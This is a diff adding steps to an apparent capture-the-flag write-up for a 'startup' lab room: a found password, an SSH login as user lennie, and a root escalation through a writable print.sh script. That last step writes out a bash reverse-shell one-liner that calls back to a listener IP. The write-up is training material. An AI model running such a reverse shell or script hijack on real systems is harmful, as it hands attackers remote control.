@@ -33,3 +33,28 @@ startup ctf
 - ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/ea897ee7-271b-4026-9539-48634e117b5f)
 - ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/21aecb76-6b14-4523-92da-b9b53f8f5536)
 - that ip is the website
+- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/54c34d45-7664-4c1c-a788-eccbe198da92)
+- found password for lennie, yes
+- 
+
+5.) ssh into lennie
+-
+- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/ff4c7212-26b9-4d1a-8999-7118a612bafe)
+- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/9bf8f11f-f0ae-4ff3-9677-0c34e4595251)
+- found user flag.
+
+6.) root time
+-
+-![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/036208da-c5ba-482b-af63-1241495f3280)
+-![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/10d7763d-6abd-4590-9786-3ce4d97458a2)
+- found my privleges within this file
+- since i can edit and write on print.sh, need some sort of bash injection or exploit 
+- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/8a66baca-6fed-425d-95b5-ec407ea67e4d)
+- bash -i >& /dev/tcp/10.2.107.89/9999 0>&1
+- vim /etc/print.sh
+    - ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/7ec26f77-53a6-4f2d-bd65-ab1caec33f10)
+- ![Uploading image.png…]()
+- done
+
+
+
